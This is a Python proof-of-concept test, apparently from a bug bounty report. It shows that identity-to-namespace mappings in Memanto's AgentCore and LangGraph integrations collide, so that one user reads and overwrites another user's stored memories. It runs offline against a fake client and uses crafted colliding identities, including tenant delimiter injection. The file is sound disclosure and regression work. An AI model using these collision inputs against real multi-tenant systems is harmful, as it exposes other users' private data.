"""PoC: distinct principals share one Memanto memory namespace.

Two integrations derive a Memanto ``agent_id`` (and therefore the
``memanto_agent_{agent_id}`` namespace) from caller identity with a mapping
that is not injective, so identities the application treats as different end
up reading -- and overwriting -- each other's memories.

1. AgentCore ``default_agent_id_resolver`` builds
   ``tenant-{tenant}-user-{user}-agent-{agent}`` and folds every run of
   characters outside ``[A-Za-z0-9_-]`` into one ``_``.
2. LangGraph ``MemantoStore`` maps a namespace tuple to
   ``"langgraph_" + "_".join(namespace)``.

Runs fully offline. The Memanto client is replaced by an in-memory fake that
enforces the same per-agent namespace isolation as the real server, so the
only thing under test is each integration's identity mapping.

    python security/bounty-1852/poc_identity_collisions.py

Exit code 1 = vulnerable (a collision leaked memory), 0 = fixed.
"""

from __future__ import annotations

import asyncio
import sys
from collections import defaultdict
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "integrations" / "agentcore"))
sys.path.insert(0, str(ROOT / "integrations" / "langgraph"))

from memanto.app.utils.errors import (  # noqa: E402
    AgentAlreadyExistsError,
    AgentNotFoundError,
)

SECRET = "My card PIN is 4921 and my SSN is 078-05-1120"


class FakeMemanto:
    """Server state shared by every client: agents and per-agent memories."""

    def __init__(self) -> None:
        self.agents: dict[str, dict] = {}
        self.memories: dict[str, list[dict]] = defaultdict(list)


class FakeClient:
    """Stand-in for SdkClient that enforces session scope per agent_id."""

    def __init__(self, server: FakeMemanto, api_key: str | None = None) -> None:
        self.server = server
        self.agent_id: str | None = None

    def create_agent(self, agent_id, pattern="tool", description=None):
        if agent_id in self.server.agents:
            raise AgentAlreadyExistsError(agent_id)
        self.server.agents[agent_id] = {
            "agent_id": agent_id,
            "description": description,
        }

    def get_agent(self, agent_id):
        if agent_id not in self.server.agents:
            raise AgentNotFoundError(agent_id)
        return dict(self.server.agents[agent_id])

    def list_agents(self):
        return {"agents": list(self.server.agents.values())}

    def activate_agent(self, agent_id, duration_hours=None):
        self.agent_id = agent_id

    def _scope(self, agent_id):
        assert agent_id == self.agent_id, "session scope enforced"
        return self.server.memories[agent_id]

    def remember(self, agent_id, **memory):
        memory["id"] = f"mem-{sum(map(len, self.server.memories.values()))}"
        self._scope(agent_id).append(memory)

    def update_memory(self, agent_id, memory_id, updates):
        for memory in self._scope(agent_id):
            if memory["id"] == memory_id:
                memory.update(updates)

    def recall(self, agent_id, query, limit=10, **_filters):
        return {"memories": list(self._scope(agent_id))[:limit]}

    def recall_recent(self, agent_id, limit=10, **_filters):
        return {"memories": list(self._scope(agent_id))[:limit]}


# --------------------------------------------------------------------------
# 1. AgentCore runtime adapter
# --------------------------------------------------------------------------

AGENTCORE_CASES = [
    (
        "emails: '.' vs '_'",
        ("acme", "john.doe@acme.com"),
        ("acme", "john_doe@acme.com"),
    ),
    (
        "emails: local part vs subdomain",
        ("acme", "john.doe@acme.com"),
        ("acme", "john@doe.acme.com"),
    ),
    ("non-Latin names all collapse to '_'", ("acme", "Мария"), ("acme", "Иван")),
    ("delimiter injection across tenants", ("a-user-b", "c"), ("a", "b-user-c")),
]


async def agentcore_leaks(victim: tuple, attacker: tuple) -> tuple[bool, str, str]:
    from memanto_agentcore import MemantoRuntimeAdapter, TurnContext
    from memanto_agentcore.adapter import default_agent_id_resolver

    v_ctx = TurnContext("rt-1", victim[1], "support", victim[0])
    a_ctx = TurnContext("rt-2", attacker[1], "support", attacker[0])
    adapter = MemantoRuntimeAdapter(FakeClient(FakeMemanto()), retain_async=False)
    await adapter.after_turn(v_ctx, query=SECRET, result="Noted.")
    context = await adapter.before_turn(a_ctx, query="what do you know about me?")
    return (
        "4921" in context,
        default_agent_id_resolver(v_ctx),
        default_agent_id_resolver(a_ctx),
    )


# --------------------------------------------------------------------------
# 2. LangGraph MemantoStore
# --------------------------------------------------------------------------


def langgraph_leaks() -> tuple[bool, bool, str]:
    """Victim stores under ("acme", "bob_x"); attacker uses ("acme_bob", "x")."""
    from langgraph_memanto import store as store_module

    server = FakeMemanto()
    with patch.object(
        store_module, "SdkClient", lambda api_key: FakeClient(server, api_key)
    ):
        victim = store_module.MemantoStore(api_key="k")
        victim.put(("acme", "bob_x"), "profile", {"content": SECRET})

        # A separate store instance, as a second worker or process would be.
        attacker = store_module.MemantoStore(api_key="k")
        try:
            item = attacker.get(("acme_bob", "x"), "profile")
            read = item is not None and "4921" in str(item.value)
            attacker.put(("acme_bob", "x"), "profile", {"content": "PIN is 0000"})
        except ValueError as exc:
            return False, False, f"refused: {exc}"

        after = victim.get(("acme", "bob_x"), "profile")
        overwritten = after is not None and "0000" in str(after.value)
        return read, overwritten, "both namespaces -> agent langgraph_acme_bob_x"


async def main() -> int:
    vulnerable = False

    print("AgentCore default_agent_id_resolver")
    for name, victim, attacker in AGENTCORE_CASES:
        leaked, v_id, a_id = await agentcore_leaks(victim, attacker)
        vulnerable |= leaked
        print(f"  [{'LEAK' if leaked else 'ok  '}] {name}")
        print(f"         victim   {victim!r:32} -> {v_id}")
        print(f"         attacker {attacker!r:32} -> {a_id}")

    print("\nLangGraph MemantoStore")
    read, overwritten, detail = langgraph_leaks()
    vulnerable |= read or overwritten
    print(f"  [{'LEAK' if read else 'ok  '}] ('acme_bob', 'x') reads ('acme', 'bob_x')")
    print(
        f"  [{'LEAK' if overwritten else 'ok  '}] "
        "('acme_bob', 'x') overwrites ('acme', 'bob_x')"
    )
    print(f"         {detail}")

    print()
    print(
        "VULNERABLE: distinct identities read and overwrite each other's memories"
        if vulnerable
        else "FIXED: every distinct identity maps to its own namespace"
    )
    return 1 if vulnerable else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
